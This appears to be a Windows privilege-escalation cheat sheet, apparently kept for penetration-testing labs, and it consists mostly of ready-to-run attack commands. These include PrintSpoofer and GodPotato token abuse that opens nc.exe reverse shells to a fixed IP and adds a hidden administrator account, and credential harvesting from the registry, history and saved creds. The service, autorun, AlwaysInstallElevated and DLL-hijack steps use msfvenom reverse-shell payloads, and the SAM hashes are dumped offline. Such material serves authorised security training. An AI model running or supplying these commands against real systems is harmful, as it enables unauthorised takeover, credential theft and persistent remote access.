###  Privilege Token Abusing 

Do you have any token privileges that could be abused?

```
#User
whoami /priv

	#Print Spoof
	.\PrintSpoofer64.exe -i -c powershell.exe
	.\PrintSpoofer64.exe -i -c "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.201 80"
	
	#God Potato
	.\GodPotato-NET4.exe -cmd "powershell.exe"
	.\GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.201 80"
	
	.\GodPotato-NET4.exe -cmd "net user lani Password123! /add" 
	.\GodPotato-NET4.exe -cmd "net localgroup administrators lani /add"
```

### Credential Harvesting
##### Registry
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
##### History
```
Get-History

(Get-PSReadlineOption).HistorySavePath

#ALWAYS CD IN AND CHECK.
cd <history_path>
dir 
cat <history.txt>
```
##### Saved Creds
```
cmdkey /list
run as /savecred /user:<username> <reverse_shell>
```
### Search for Information

Is there any interesting abnormal system files or folders that need to be enumerated?
##### Searching Folders
```
#Specific File Types
Get-ChildItem -Path C:\<folder>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini, *bk, *backup*, -File -Recurse -ErrorAction SilentlyContinue

#All Files in Folder
Get-ChildItem -Path C:\<folder>\ -File -Recurse -ErrorAction SilentlyContinue

#Specific file name
Get-ChildItem -Path C:\ -Filter '<filename>' -File -Recurse -ErrorAction SilentlyContinue

#Keepass Database
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

### Service Exploiting
https://steflan-security.com/windows-privilege-escalation-weak-permission/
#### Insecure Service Permissions
Is there any service that have permissions to change the configuration?
```
#We want the "SERVICE_CHANGE_CONFIG" set.
sc.exe qc <service>

#Modify that config and add path to shell.
sc.exe config <service_name> <option>=<value>
```

##### Unquoted Service Paths
Is there any unquoted service paths?
```
#To see unquoted services
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Get-WmiObject -Class Win32_Service | Where-Object { $_.State -eq 'Running' -and $_.PathName -notlike '*"*' } | Select-Object Name, PathName

#To see if we can stop/start service
net stop <service>

#To see if we can write to the path.
icacls "C:\<folder>\"
```

#### Insecure Service Executables
Is there any service or executable we have full access to and can overwrite?

```
#check permissions
icacls "C:\<service>"

#Can we stop / start?
net stop <service>

#Remember to make a backup of the old service.
```

##### Checking Permissions
```
#Check file and folder
icacls "C:\<service.exe>"
icacls "C:\<folder>\"

#check service start / stop
net stop <service_name>
Stop-Service <service_name>
```
### Scheduled Tasks
Are there any abnormal scheduled tasks?
```
#Any custom scheduled tasks?
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State

#do we have permissions to overwrite it with a shell?
icacls "C:\<service.exe>"
```
### Startup Apps
Can we modify the startup apps directory?
```
#If we can modify this directroy and add a shell.
 .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

#Check SeShutdownPrivilege enabled
whoami /priv 

#Restart system
shutdown /r /t 0
```

### Registry Exploits

#### AutoRuns
Are there any abnormal auto run services?
```
#AutoRun Services
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.StartMode -like 'Auto'}

#AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

#Can we modify?
icacls "C:\<service.exe>"

#Add shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename.exe>

#Check SeShutdownPrivilege enabled
whoami /priv 

#Restart system
shutdown /r /t 0
```

#### AlwaysInstallElevated
Is this value turned on machine and user?
```
#Check AlwaysInstallElevated value is set on local machine and current user.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

#Generate msi shell.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<host> LPORT=<port> -f msi -o /tools/reverse.msi
msiexec /quiet /qn /i reverse.msi
```

#### DLL Hijacking
```
1. Check can service be stopped and started.
2. Copy the service executable to your host and use ProcMon to monitor what DLLs the executable tries to run.
	Filter NAME NOT FOUND
	Filter .DLL
3. Check folder or path it is searching is writable.
4. Upload malicious executable. (msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o /tools/hijackme.dll)
5. Restart the service.
```

### Installed Apps
Search those version numbers for known exploits!
```
#In powershell
Get-WmiObject -Class Win32_Product | Select-Object Name,Version

#Otherwise just manually check in both the program files folders.
cd "C:\program files"
cd "C:\program files (x86)"

#Search for local privilege esclation in those version numbers.
```

#### LOCAL SERVICES
Ports open that weren't open externally?
```
netstat -ano
```
#### SAM
Can you read and download the SAM and SYSTEM?
```
#Check here
C:\Windows\Repair or C:\Windows\System32\config\RegBack

#Dump offline
impacket-secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL
```
### LAPS

```
#To check if activated and runnnig
#Check registry
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

#Check installed
dir "C:\Program Files\LAPS\"

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps
```

### Kernel Exploits
```
Methodology
1. Enumerate Windows version / patch level. (systeminfo)
2. Find matching exploits. (Google, ExploitDB, GitHub)
3. Compile and run.

Tools
- Windows Exploit Suggester - wesng
- Precompiled Kernel Exploits - SecWiki
- Watson - rasta-mouse

Notes
- Be careful these can be unstable and may crash the system.
```

### Automation
```
winPEAs
ADPEAs
```